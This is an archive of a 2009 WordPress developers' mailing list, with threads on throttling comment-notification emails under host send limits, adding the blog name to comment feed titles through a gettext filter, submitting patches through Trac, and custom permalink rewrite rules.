Message-ID: <e4dc67e0910091239n2a11691blcbf35aa2f85d51f2@mail.gmail.com>

One of my blogs is on 000webhost and I use Mark Jaquith's "Subscribe
to Comments" plugin among others and its hosting account was suspended
one night when a discussion, well, got out of hand.

000webhost's email sending limit is 'No more than 30 emails per 5
minutes and no more than 100 emails per hour.'

000webhost's PHP config doesn't support SSL/TLS so I can't send via
Gmail. In any case, Gmail also has a limit of "100 people at a time".

So as a stopgap I added a "ORDER BY comment_date DESC LIMIT 28" clause
to Jaquith's plugin and crossed my fingers.

Before I go study how to add the Throttle plugin to Swift Mailer and
use Swift as a wp_mail() replacement, I thought of coming here to ask
if someone has already made or begun a throttling solution or plugin.

A plugin like this may be interesting to write for public release
because, for example, in this case, 000webhost has two limits and
gmail has another kind of limit.

W

P.S. It amuses me how often various plugins just "do their own thing"
to send their mail.

From otto at ottodestruct.com  Fri Oct  9 20:31:54 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Oct 2009 15:31:54 -0500
Subject: [wp-hackers] How to throttle emails on hosts with email sending
	limits?
In-Reply-To: <e4dc67e0910091239n2a11691blcbf35aa2f85d51f2@mail.gmail.com>
References: <e4dc67e0910091239n2a11691blcbf35aa2f85d51f2@mail.gmail.com>
Message-ID: <161617690910091331j7afc7a6cw4b485c584f0eb0d3@mail.gmail.com>

Looking at the plugin, it appears to hook to comment_post to send the
notification emails.

I'd rework it a bit. Change the comment_post hook to run a new
function which does a wp_schedule_event to a new action (maybe
stc_send_notifications?). Then hook that to a new function which does
the following:
1. checks to see if anything needs sending still
2. sends emails up to limit
3. if still some left, do another wp_schedule_event to rerun at some
future period of time.

-Otto
Sent from Memphis, TN, United States


On Fri, Oct 9, 2009 at 2:39 PM, William Canino
<william.canino at googlemail.com> wrote:
> One of my blogs is on 000webhost and I use Mark Jaquith's "Subscribe
> to Comments" plugin among others and its hosting account was suspended
> one night when a discussion, well, got out of hand.
>
> 000webhost's email sending limit is 'No more than 30 emails per 5
> minutes and no more than 100 emails per hour.'
>
> 000webhost's PHP config doesn't support SSL/TLS so I can't send via
> Gmail. In any case, Gmail also has a limit of "100 people at a time".
>
> So as a stopgap I added a "ORDER BY comment_date DESC LIMIT 28" clause
> to Jaquith's plugin and crossed my fingers.
>
> Before I go study how to add the Throttle plugin to Swift Mailer and
> use Swift as a wp_mail() replacement, I thought of coming here to ask
> if someone has already made or begun a throttling solution or plugin.
>
> A plugin like this may be interesting to write for public release
> because, for example, in this case, 000webhost has two limits and
> gmail has another kind of limit.
>
> W
>
> P.S. It amuses me how often various plugins just "do their own thing"
> to send their mail.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Fri Oct  9 20:33:29 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 9 Oct 2009 15:33:29 -0500
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <op.u1jp19cmr6yny2@toscho.de>
References: <op.u1joz9bsr6yny2@toscho.de>
	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com> 
	<op.u1jp19cmr6yny2@toscho.de>
Message-ID: <161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com>

Well, there's no filter on the "Comments on:" section, so you're
basically reduced to editing the core code directly.

-Otto
Sent from Memphis, TN, United States


On Fri, Oct 9, 2009 at 1:38 PM, Thomas Scholz <info at toscho.de> wrote:
> Otto:
>
>> Well, I'd try this in your code, for starters:
>>
>> return get_bloginfo('name') . ' - ' . $str;
>
> This results in:
> <title>Comments on: toscho.design - WordPress: Kommentarfeed mit
> Blognamen</title>
>
> But I don't want the blog name somewhere between other words, because this
> reduces the scannability ? exact the opposite of what I want to achive.
>
> thomas
>
> --
> Redaktion, Druck- und Webdesign
> http://toscho.de ? 0160/1764727
> Twitter: @toscho
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From gaarai at gaarai.com  Fri Oct  9 20:57:55 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 09 Oct 2009 15:57:55 -0500
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <op.u1joz9bsr6yny2@toscho.de>
References: <op.u1joz9bsr6yny2@toscho.de>
Message-ID: <4ACFA3D3.7090804@gaarai.com>

This code works. It's nasty, but it works.

    add_action( 'rss2_comments_ns', 'change_comment_feed_title' );

    function change_comment_feed_title() {
        ob_start( 'modify_comment_feed_title' );
        add_filter( 'pre_option_home', 'clear_buffering' );
    }

    function modify_comment_feed_title( $content ) {
        return preg_replace( '|<title>.+?</title>|', '<title>' . get_bloginfo( 'name' ) . ' Comments</title>', $content );
    }

    function clear_buffering( $return_false ) {
        ob_end_flush();

        return false;
    }

I added this to the theme's functions.php file for quick testing, but it
can be put into a plugin, etc.

Of course, you'll need to modify the regular expression to do whatever
you need to do with the title.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Thomas Scholz wrote:
> Hi,
>
> I'm looking for a way to prepend my blog name to the title of comment
> feeds for single articles.
>
> The template in WordPress (/wp-includes/feed-rss2-comments.php):
>
> <title><?php
>     if ( is_singular() )
>         printf(ent2ncr(__('Comments on: %s')), get_the_title_rss());
>     elseif ( is_search() )
>         printf(ent2ncr(__('Comments for %s searching on %s')),
> get_bloginfo_rss( 'name' ), esc_attr($wp_query->query_vars['s']));
>     else
>     printf(ent2ncr(__('Comments for %s')), get_bloginfo_rss( 'name' )
> . get_wp_title_rss());
> ?></title>
>
> As you can see, I'm able to add a filter to 'the_title_rss' and add
> the blog name as a suffix.
> <http://toscho.de/2009/wordpress-kommentarfeed-blogname/>
>
> But how do I set the blog name in the first place? Any ideas?
>
> Thomas
>

From ajd at cloudiness.com  Fri Oct  9 21:55:41 2009
From: ajd at cloudiness.com (Art Delano)
Date: Fri, 9 Oct 2009 17:55:41 -0400
Subject: [wp-hackers] How to throttle emails on hosts with email sending
	limits?
In-Reply-To: <161617690910091331j7afc7a6cw4b485c584f0eb0d3@mail.gmail.com>
References: <e4dc67e0910091239n2a11691blcbf35aa2f85d51f2@mail.gmail.com>
	<161617690910091331j7afc7a6cw4b485c584f0eb0d3@mail.gmail.com>
Message-ID: <8BA69615-32FE-432A-AF1F-0D513C6D96CE@cloudiness.com>

Would it be possible to make it work like this?
1. Check if anything needs sending
2. Concatenates all pending emails into a digested message

This would reduce the number of mails sent to one per time window.

Art

On Oct 9, 2009, at 4:31 PM, Otto wrote:

> Looking at the plugin, it appears to hook to comment_post to send the
> notification emails.
>
> I'd rework it a bit. Change the comment_post hook to run a new
> function which does a wp_schedule_event to a new action (maybe
> stc_send_notifications?). Then hook that to a new function which does
> the following:
> 1. checks to see if anything needs sending still
> 2. sends emails up to limit
> 3. if still some left, do another wp_schedule_event to rerun at some
> future period of time.
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Fri, Oct 9, 2009 at 2:39 PM, William Canino
> <william.canino at googlemail.com> wrote:
>> One of my blogs is on 000webhost and I use Mark Jaquith's "Subscribe
>> to Comments" plugin among others and its hosting account was  
>> suspended
>> one night when a discussion, well, got out of hand.
>>
>> 000webhost's email sending limit is 'No more than 30 emails per 5
>> minutes and no more than 100 emails per hour.'
>>
>> 000webhost's PHP config doesn't support SSL/TLS so I can't send via
>> Gmail. In any case, Gmail also has a limit of "100 people at a time".
>>
>> So as a stopgap I added a "ORDER BY comment_date DESC LIMIT 28"  
>> clause
>> to Jaquith's plugin and crossed my fingers.
>>
>> Before I go study how to add the Throttle plugin to Swift Mailer and
>> use Swift as a wp_mail() replacement, I thought of coming here to ask
>> if someone has already made or begun a throttling solution or plugin.
>>
>> A plugin like this may be interesting to write for public release
>> because, for example, in this case, 000webhost has two limits and
>> gmail has another kind of limit.
>>
>> W
>>
>> P.S. It amuses me how often various plugins just "do their own thing"
>> to send their mail.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From peter.westwood at ftwr.co.uk  Fri Oct  9 22:05:56 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 9 Oct 2009 23:05:56 +0100
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com>
References: <op.u1joz9bsr6yny2@toscho.de>
	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>
	<op.u1jp19cmr6yny2@toscho.de>
	<161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com>
Message-ID: <FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>

There is a filter on the "Comments on" bit.

If you dig into the translation functions there are filters to let  
plugins modify the translated string which can be used to prepend  
something here.

--
Peter Westwood
http://peter.westwood.name

On 9 Oct 2009, at 21:33, Otto <otto at ottodestruct.com> wrote:

> Well, there's no filter on the "Comments on:" section, so you're
> basically reduced to editing the core code directly.
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Fri, Oct 9, 2009 at 1:38 PM, Thomas Scholz <info at toscho.de> wrote:
>> Otto:
>>
>>> Well, I'd try this in your code, for starters:
>>>
>>> return get_bloginfo('name') . ' - ' . $str;
>>
>> This results in:
>> <title>Comments on: toscho.design - WordPress: Kommentarfeed mit
>> Blognamen</title>
>>
>> But I don't want the blog name somewhere between other words,  
>> because this
>> reduces the scannability ? exact the opposite of what I want to ac 
>> hive.
>>
>> thomas
>>
>> --
>> Redaktion, Druck- und Webdesign
>> http://toscho.de ? 0160/1764727
>> Twitter: @toscho
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From gaarai at gaarai.com  Fri Oct  9 22:07:53 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 09 Oct 2009 17:07:53 -0500
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>
References: <op.u1joz9bsr6yny2@toscho.de>	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>	<op.u1jp19cmr6yny2@toscho.de>	<161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com>
	<FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>
Message-ID: <4ACFB439.7050202@gaarai.com>

Good catch Peter. I did the common mistake of trying too hard.

Chris Jean
http://gaarai.com/
http://wp-roadmap.com/
http://dnsyogi.com/



Peter Westwood wrote:
> There is a filter on the "Comments on" bit.
>
> If you dig into the translation functions there are filters to let
> plugins modify the translated string which can be used to prepend
> something here.
>
> -- 
> Peter Westwood
> http://peter.westwood.name
>
> On 9 Oct 2009, at 21:33, Otto <otto at ottodestruct.com> wrote:
>
>> Well, there's no filter on the "Comments on:" section, so you're
>> basically reduced to editing the core code directly.
>>
>> -Otto
>> Sent from Memphis, TN, United States

From info at toscho.de  Sat Oct 10 00:17:39 2009
From: info at toscho.de (Thomas Scholz)
Date: Sat, 10 Oct 2009 02:17:39 +0200
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>
References: <op.u1joz9bsr6yny2@toscho.de>
	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>
	<op.u1jp19cmr6yny2@toscho.de>
	<161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com>
	<FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>
Message-ID: <op.u1j5rpwrr6yny2@toscho.de>

Peter Westwood:

> There is a filter on the "Comments on" bit.
>
> If you dig into the translation functions there are filters to let  
> plugins modify the translated string which can be used to prepend  
> something here.

Thanks, that was it!

Here's my code (replace 'Kommentare zu:' with 'Comments on:' in english  
blogs):

// functions.php
add_filter('gettext', 'rss_title_prefix');

function rss_title_prefix($str)
{
	if ( is_feed() AND is_singular() )
	{
		return str_replace('Kommentare zu:', get_bloginfo('name') . ' -  
Kommentare zu:', $str);
	}
	return $str;
}

I've updated my blog post at  
<http://toscho.de/2009/wordpress-kommentarfeed-blogname/>.

Regards
Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From danielrstout at gmail.com  Sat Oct 10 03:19:16 2009
From: danielrstout at gmail.com (Daniel R Stout)
Date: Fri, 09 Oct 2009 22:19:16 -0500
Subject: [wp-hackers] Submitting code to the WP project
Message-ID: <4ACFFD34.6060007@gmail.com>

Hi --

I was a long-time Movable Type user (2003-2009) and recently switched to 
WordPress. To make the transition smoother, I made some improvements to 
the MT importer in WordPress. My question is thus: what is the proper or 
best way to submit my code to the WordPress project? I'm familiar with 
SVN but am not familiar with the process for getting code submitted to 
WP. What would you recommend?

My code changes are all in the file /wp-admin/import/mt.php. I fixed 
three problems with the importer:

    1. Tags are ignored and not imported
    2. Line breaks are incorrectly processed for non-HTML entries
    3. Keywords are imported as a single string

Thanks.

Dan

-- 
Daniel R Stout
danielrstout at gmail.com
http://manufacturedenvironments.com/

From navjotjsingh at gmail.com  Sat Oct 10 03:27:20 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Sat, 10 Oct 2009 08:57:20 +0530
Subject: [wp-hackers] Submitting code to the WP project
In-Reply-To: <4ACFFD34.6060007@gmail.com>
References: <4ACFFD34.6060007@gmail.com>
Message-ID: <7b9e108c0910092027k52656e9j555330faeb7e7632@mail.gmail.com>

Submit a Ticket along with a patch at http://core.trac.wordpress.org/

Regards
Navjot Singh

On Sat, Oct 10, 2009 at 8:49 AM, Daniel R Stout <danielrstout at gmail.com>wrote:

> Hi --
>
> I was a long-time Movable Type user (2003-2009) and recently switched to
> WordPress. To make the transition smoother, I made some improvements to the
> MT importer in WordPress. My question is thus: what is the proper or best
> way to submit my code to the WordPress project? I'm familiar with SVN but am
> not familiar with the process for getting code submitted to WP. What would
> you recommend?
>
> My code changes are all in the file /wp-admin/import/mt.php. I fixed three
> problems with the importer:
>
>   1. Tags are ignored and not imported
>   2. Line breaks are incorrectly processed for non-HTML entries
>   3. Keywords are imported as a single string
>
> Thanks.
>
> Dan
>
> --
> Daniel R Stout
> danielrstout at gmail.com
> http://manufacturedenvironments.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From shane at bugssite.org  Sat Oct 10 03:26:56 2009
From: shane at bugssite.org (Shane A. Froebel)
Date: Fri, 09 Oct 2009 23:26:56 -0400
Subject: [wp-hackers] Submitting code to the WP project
In-Reply-To: <4ACFFD34.6060007@gmail.com>
References: <4ACFFD34.6060007@gmail.com>
Message-ID: <4ACFFF00.3050607@bugssite.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Submit the code to the trac site at http://core.trac.wordpress.org/

Welcome!

Your Friend,
Shane

Daniel R Stout wrote:
> Hi --
> 
> I was a long-time Movable Type user (2003-2009) and recently switched to
> WordPress. To make the transition smoother, I made some improvements to
> the MT importer in WordPress. My question is thus: what is the proper or
> best way to submit my code to the WordPress project? I'm familiar with
> SVN but am not familiar with the process for getting code submitted to
> WP. What would you recommend?
> 
> My code changes are all in the file /wp-admin/import/mt.php. I fixed
> three problems with the importer:
> 
>    1. Tags are ignored and not imported
>    2. Line breaks are incorrectly processed for non-HTML entries
>    3. Keywords are imported as a single string
> 
> Thanks.
> 
> Dan
> 
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)

iQIcBAEBAgAGBQJKz/7/AAoJEC7/vS6gbNwFBcsP/R7cTBF0CWro7NsFWX6kneih
XGqVpKytsUuhczVXtJQbFE79kJ1kbYTBRKl2TTOCpfxYUgPQpHdqXrntemlbmoIA
3ulJzFIx4Lag1RxUXjGFjvpkwwwkIm2xkpp4tf+KsJHZVdiE8nlu0VISlgC9oahZ
JiQcuElKQ3rBZswN5+/gcEXCEF26AwfDVw9Ni8EAjjzkUf3oCEx4APtCVixDpL59
4w6p7fuuUFINRuDLVR4JMNoK24fd0i4IujptdHYKNTDvs5+CCZOIlgpPz8V3OSAN
XaJdizgBniTB3MomkGAiutrZ/Lg7I6FRuipn8HLlRRrpktyKSHZvalcO5f1acpke
2PPrID/DeBQfwo/d34+gzrdFDJ1uEFLgug1YMgbdr+QZqE5cokw3hEihUtDltNX2
c874TeyExoRXus4nzYun6Zd8fZeTuZUxBvNoB6vpDuK/QfeKYRO3VgBhKQaD7rll
Cks7tkZjo54x5WJw/Ul38lExeIdsrbkVlHYy1JS+5tZ84p8c36c1koFW41RCnteh
5tctraJIA8RTppGyYHH2w42nt9PYxmg8GDtOmJz7tNIe2Ldj3UB8PingVjmd1YZG
Aezpy/8WVL2l50GDa+SjmSKC0kwJr9KIEXhwEsXmURIT2iGPvF7YPsZGKzSLYiGE
2CHoIoPM6gG0dDedlWoB
=cTKy
-----END PGP SIGNATURE-----

From danielrstout at gmail.com  Sat Oct 10 04:16:14 2009
From: danielrstout at gmail.com (Daniel R Stout)
Date: Fri, 09 Oct 2009 23:16:14 -0500
Subject: [wp-hackers] Submitting code to the WP project
In-Reply-To: <7b9e108c0910092027k52656e9j555330faeb7e7632@mail.gmail.com>
References: <4ACFFD34.6060007@gmail.com>
	<7b9e108c0910092027k52656e9j555330faeb7e7632@mail.gmail.com>
Message-ID: <4AD00A8E.3050905@gmail.com>

Okay, thanks, Shane and Navjot. I'll check out the trac site.

Dan

Navjot Singh wrote:
> Submit a Ticket along with a patch at http://core.trac.wordpress.org/
> 
> Regards
> Navjot Singh
> 
> On Sat, Oct 10, 2009 at 8:49 AM, Daniel R Stout <danielrstout at gmail.com>wrote:
> 
>> Hi --
>>
>> I was a long-time Movable Type user (2003-2009) and recently switched to
>> WordPress. To make the transition smoother, I made some improvements to the
>> MT importer in WordPress. My question is thus: what is the proper or best
>> way to submit my code to the WordPress project? I'm familiar with SVN but am
>> not familiar with the process for getting code submitted to WP. What would
>> you recommend?
>>
>> My code changes are all in the file /wp-admin/import/mt.php. I fixed three
>> problems with the importer:
>>
>>   1. Tags are ignored and not imported
>>   2. Line breaks are incorrectly processed for non-HTML entries
>>   3. Keywords are imported as a single string
>>
>> Thanks.
>>
>> Dan
>>
>> --
>> Daniel R Stout
>> danielrstout at gmail.com
>> http://manufacturedenvironments.com/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 


-- 
Daniel R Stout
danielrstout at gmail.com
http://manufacturedenvironments.com/

From peter.westwood at ftwr.co.uk  Sat Oct 10 07:59:27 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 10 Oct 2009 08:59:27 +0100
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <op.u1j5rpwrr6yny2@toscho.de>
References: <op.u1joz9bsr6yny2@toscho.de>
	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>
	<op.u1jp19cmr6yny2@toscho.de>
	<161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com>
	<FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>
	<op.u1j5rpwrr6yny2@toscho.de>
Message-ID: <86798269-6A1C-4EA3-92E4-8358B230DBFF@ftwr.co.uk>


On 10 Oct 2009, at 01:17, Thomas Scholz wrote:

> Peter Westwood:
>
>> There is a filter on the "Comments on" bit.
>>
>> If you dig into the translation functions there are filters to let  
>> plugins modify the translated string which can be used to prepend  
>> something here.
>
> Thanks, that was it!
>
> Here's my code (replace 'Kommentare zu:' with 'Comments on:' in  
> english blogs):
>
> // functions.php
> add_filter('gettext', 'rss_title_prefix');
>
> function rss_title_prefix($str)
> {
> 	if ( is_feed() AND is_singular() )
> 	{
> 		return str_replace('Kommentare zu:', get_bloginfo('name') . ' -  
> Kommentare zu:', $str);
> 	}
> 	return $str;
> }
>
> I've updated my blog post at <http://toscho.de/2009/wordpress-kommentarfeed-blogname/ 
> >.

This is really good... but you can do even better.

The filter passes in a lot more useful info.

(follow code is untested even by a php interpreter)

add_filter('gettext', 'rss_title_prefix', 10, 3)

function rss_title_prefix($translation, $original, $domain) {
	if ( ( 'default' == $domain ) && ('Comments on: %s' == $original) {
		return get_bloginfo('name') . ' - ' . $translation;
	}
	return $translation;
}


This will ensure you match the exact string (and it works for any  
language.

Peter
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From frank at bueltge.de  Sat Oct 10 09:07:24 2009
From: frank at bueltge.de (Frank Bueltge)
Date: Sat, 10 Oct 2009 11:07:24 +0200
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <86798269-6A1C-4EA3-92E4-8358B230DBFF@ftwr.co.uk>
References: <op.u1joz9bsr6yny2@toscho.de>
	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com> 
	<op.u1jp19cmr6yny2@toscho.de>
	<161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com> 
	<FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>
	<op.u1j5rpwrr6yny2@toscho.de> 
	<86798269-6A1C-4EA3-92E4-8358B230DBFF@ftwr.co.uk>
Message-ID: <db047a770910100207q49d5ca9rd765b93bb6356e07@mail.gmail.com>

Hello Thoscho,
great idea.

Hello Peter,
nice idea for filter with mutlilanguage support!
only the script has two small bugs on the script ( ) and ; ):

if ( !function_exists('rss_title_prefix') ) {
    function rss_title_prefix($translation, $original, $domain) {
           if ( ( 'default' == $domain ) && ( 'Comments on: %s' ==
$original ) ) {
                   return get_bloginfo('name') . ' - ' . $translation;
           }
           return $translation;
    }
    add_filter('gettext', 'rss_title_prefix', 10, 3);
}

Steuernr: 204/5756/0999 Steueridentnr.: DE263849534
Gesch?ftsf?hrender Gesellschafter: Heinz Roh? HRB 65224 Amtsgericht K?ln

http://inpsyde.com
http://pressthis.de



On Sat, Oct 10, 2009 at 9:59 AM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
>
> On 10 Oct 2009, at 01:17, Thomas Scholz wrote:
>
>> Peter Westwood:
>>
>>> There is a filter on the "Comments on" bit.
>>>
>>> If you dig into the translation functions there are filters to let
>>> plugins modify the translated string which can be used to prepend something
>>> here.
>>
>> Thanks, that was it!
>>
>> Here's my code (replace 'Kommentare zu:' with 'Comments on:' in english
>> blogs):
>>
>> // functions.php
>> add_filter('gettext', 'rss_title_prefix');
>>
>> function rss_title_prefix($str)
>> {
>> ? ? ? ?if ( is_feed() AND is_singular() )
>> ? ? ? ?{
>> ? ? ? ? ? ? ? ?return str_replace('Kommentare zu:', get_bloginfo('name') .
>> ' - Kommentare zu:', $str);
>> ? ? ? ?}
>> ? ? ? ?return $str;
>> }
>>
>> I've updated my blog post at
>> <http://toscho.de/2009/wordpress-kommentarfeed-blogname/>.
>
> This is really good... but you can do even better.
>
> The filter passes in a lot more useful info.
>
> (follow code is untested even by a php interpreter)
>
> add_filter('gettext', 'rss_title_prefix', 10, 3)
>
> function rss_title_prefix($translation, $original, $domain) {
> ? ? ? ?if ( ( 'default' == $domain ) && ('Comments on: %s' == $original) {
> ? ? ? ? ? ? ? ?return get_bloginfo('name') . ' - ' . $translation;
> ? ? ? ?}
> ? ? ? ?return $translation;
> }
>
>
> This will ensure you match the exact string (and it works for any language.
>
> Peter
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From info at toscho.de  Sat Oct 10 12:20:26 2009
From: info at toscho.de (Thomas Scholz)
Date: Sat, 10 Oct 2009 14:20:26 +0200
Subject: [wp-hackers] Prepend blog name in comment feed's title
In-Reply-To: <db047a770910100207q49d5ca9rd765b93bb6356e07@mail.gmail.com>
References: <op.u1joz9bsr6yny2@toscho.de>
	<161617690910091122s2424a7dey4354108e41c9372e@mail.gmail.com>
	<op.u1jp19cmr6yny2@toscho.de>
	<161617690910091333y5f5fb1b1je427692aab6b609c@mail.gmail.com>
	<FE62B08F-64A4-483A-9745-8B57512AC803@ftwr.co.uk>
	<op.u1j5rpwrr6yny2@toscho.de>
	<86798269-6A1C-4EA3-92E4-8358B230DBFF@ftwr.co.uk>
	<db047a770910100207q49d5ca9rd765b93bb6356e07@mail.gmail.com>
Message-ID: <op.u1k28cakr6yny2@toscho.de>

Frank Bueltge,

> Hello Peter,
> nice idea for filter with mutlilanguage support!

Thanks to both of you. I've updated the blog post and I separated the code  
into a plugin.

Peter's I18n fix gave me courage to request my first SVN access for the WP  
plugin directory. :)

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From emartin24 at gmail.com  Sat Oct 10 14:00:52 2009
From: emartin24 at gmail.com (Eric Martin)
Date: Sat, 10 Oct 2009 07:00:52 -0700 (PDT)
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <674b4a3b0910090915v5b3c030cid83105bdbf0cc557@mail.gmail.com>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
	<674b4a3b0910090915v5b3c030cid83105bdbf0cc557@mail.gmail.com>
Message-ID: <b8676ae0-e005-4248-96c0-b8193b942251@b3g2000pre.googlegroups.com>

On Oct 9, 9:15?am, Austin Matzko <if.webs... at gmail.com> wrote:
> On Fri, Oct 9, 2009 at 10:48 AM, Eric Martin <emarti... at gmail.com> wrote:
> > I want to be able to allow users to custom sort a group of posts by
> > adding a custom rewrite rule. I'm thinking of the following structure:
>
> > /some-slug/sort/title:desc/
> > /some-slug/sort/date:desc/
> > /some-slug/sort/downloads:desc/
>

[snip]

>
> If "some-slug" is for pages, why don't you attach a callback to the
> "page_rewrite_rules" filter ("post_rewrite_rules" for posts)? ?Then
> copy the array of rules passed to the callback, and loop through that
> copy, modifying each key and value to work with your rewrite scheme.
> Then prepend the modified array to the current ones and return.
>
> Or create the modified version by temporarily modifying
> $wp_rewrite->page_structure, then calling
> $wp_rewrite->page_rewrite_rules() to generate the modified version.
> However, I don't think that would help with something like
>
> > /some-slug/page/2/sort/title:desc/
>

Thanks for the suggestions Austin. I was hoping to be able to use the
rewrite api w/o having to use callbacks to manually parse the rules.
However, if that isn't possible, I'll be sure to try these out ;)

-Eric

From emartin24 at gmail.com  Sat Oct 10 14:01:56 2009
From: emartin24 at gmail.com (Eric Martin)
Date: Sat, 10 Oct 2009 07:01:56 -0700 (PDT)
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <161617690910091118r4c964c20n6d80e69c53ac6155@mail.gmail.com>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
	<161617690910091118r4c964c20n6d80e69c53ac6155@mail.gmail.com>
Message-ID: <5824bbb8-f7d3-48eb-a055-4d8faec7c768@i12g2000prg.googlegroups.com>



On Oct 9, 11:18?am, Otto <o... at ottodestruct.com> wrote:
> Try this example on for size:
>
> http://codex.wordpress.org/Custom_Queries#Permalinks_for_Custom_Archives
>
> -Otto
>

Thanks for the link. I've seen this method used by others, but it
doesn't appear to be utilizing the rewrite api, which is what I'd
prefer to do.

-Eric


> wp-hack... at lists.automattic.comhttp://lists.automattic.com/mailman/listinfo/wp-hackers

From emartin24 at gmail.com  Sat Oct 10 14:03:43 2009
From: emartin24 at gmail.com (Eric Martin)
Date: Sat, 10 Oct 2009 07:03:43 -0700 (PDT)
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <E4E0492A-0A6F-4E26-A9F1-7A7295D80CFF@newclarity.net>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
	<E4E0492A-0A6F-4E26-A9F1-7A7295D80CFF@newclarity.net>
Message-ID: <1b7f4b94-0659-452a-9ae5-51637c0bc2cc@j9g2000prh.googlegroups.com>

On Oct 9, 11:46?am, Mike Schinkel <mikeschin... at newclarity.net> wrote:
> Eric,
>
> I have a custom plugin I've written for my own use that makes ?
> extensive use of URL rewrite. ?It's not in a state to be released but ?
> is something I could send you if you like. ?It powershttp://pm-sherpa.com
> . ?Email me and I'll forward to you.

I would love to see what you've done. I'll shoot you an email.

>
> BTW, I would not recommend using a colon in your URL like you have. A ?
> colon is a reserved character in the URI spec and as such will often ?
> get encoded by various softwares (i.e. title%3Adesc instead of ?
> title:desc):

I had actually been using the pipe character, but for some reason use
a colon in my examples. Either way, I appreciate the reminder!

[snip]

-Eric

From kontakt at joernroeder.de  Sat Oct 10 14:27:09 2009
From: kontakt at joernroeder.de (=?utf-8?Q?J=C3=B6rn_R=C3=B6der?=)
Date: Sat, 10 Oct 2009 16:27:09 +0200
Subject: [wp-hackers] Custom permalinks with the Rewrite API
In-Reply-To: <1b7f4b94-0659-452a-9ae5-51637c0bc2cc@j9g2000prh.googlegroups.com>
References: <738f5882-3202-48d3-9612-d38cf5fc1a87@x25g2000prf.googlegroups.com>
